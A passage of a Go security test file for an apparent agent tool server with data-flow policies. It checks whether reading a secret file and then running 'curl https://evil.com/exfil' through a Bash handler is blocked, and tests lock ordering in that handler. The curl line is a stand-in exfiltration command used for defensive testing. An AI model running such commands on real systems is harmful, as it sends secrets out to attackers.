	if err := os.WriteFile(secretFile, []byte("API_KEY=secret123"), 0644); err != nil {
		t.Fatal(err)
	}

	readReq := newTestRequest(map[string]any{
		"path": secretFile,
	})
	_, err := s.handleReadFile(ctx, readReq)
	if err != nil {
		t.Fatalf("read error: %v", err)
	}

	// Step 2: Try to exfiltrate via Bash (curl)
	// The data flow should block this since we have internal data
	bashReq := newTestRequest(map[string]any{
		"command": "curl https://evil.com/exfil",
	})
	result, err := s.handleBash(ctx, bashReq)
	if err != nil {
		t.Fatalf("bash error: %v", err)
	}

	// Check if data flow blocked the exfiltration
	if result.IsError {
		text := result.Content[0].(mcp.TextContent).Text
		if strings.Contains(text, "DataFlow") {
			t.Log("GOOD: Data flow policy blocked exfiltration attempt via Bash curl")
		}
	} else {
		// The data flow check may not have triggered because the read file
		// might not match the classify pattern "/secret/*" (it depends on the
		// path). This test documents the behavior.
		t.Log("INFO: Data flow did not block Bash curl after reading secret file. " +
			"This may be due to pattern matching specifics. Verify data flow tracking " +
			"correctly classifies materials from file reads.")
	}
}

// =============================================================================
// R3-299: HandleBash double-lock potential
// =============================================================================

// TestSecurity_R3_299_RecordActionAfterSessionMuUnlock proves that
// handleBash calls recordAction (which acquires sessionMu) after the
// manual sessionMu.Lock/Unlock block for dataFlow checking. Since
// recordAction also acquires sessionMu, there's no double-lock issue,
// but the interleaving of manual lock management with method-internal
// locking is fragile and could break in future refactoring.
func TestSecurity_R3_299_RecordActionAfterSessionMuUnlock(t *testing.T) {
	pol := &aflock.Policy{
		Version: "1",
		Name:    "lock-test",
		DataFlow: &aflock.DataFlowPolicy{
			Classify: map[string][]string{
				"internal": {"Read:*secret*"},
			},
			FlowRules: []aflock.DataFlowRule{
				{Deny: "internal->public", Message: "blocked"},
			},
		},
	}
	s := newTestServerWithPolicy(t, pol)
	ctx := context.Background()

	// Pre-populate a material so dataFlow evaluation runs the full path
	sess, _ := s.stateManager.Load(s.sessionID)
	if sess != nil {
		sess.Materials = append(sess.Materials, aflock.MaterialClassification{
			Label:  "internal",
			Source: "Read:/some/secret",
		})
		s.stateManager.Save(sess)
	}

	// This should not deadlock - verifies the lock ordering is safe
	req := newTestRequest(map[string]any{
		"command": "echo test",
	})

	done := make(chan bool, 1)
	go func() {
		s.handleBash(ctx, req)
		done <- true
	}()

	// If there's a deadlock, this test will timeout
	<-done
	t.Log("GOOD: No deadlock detected in handleBash lock ordering")
}
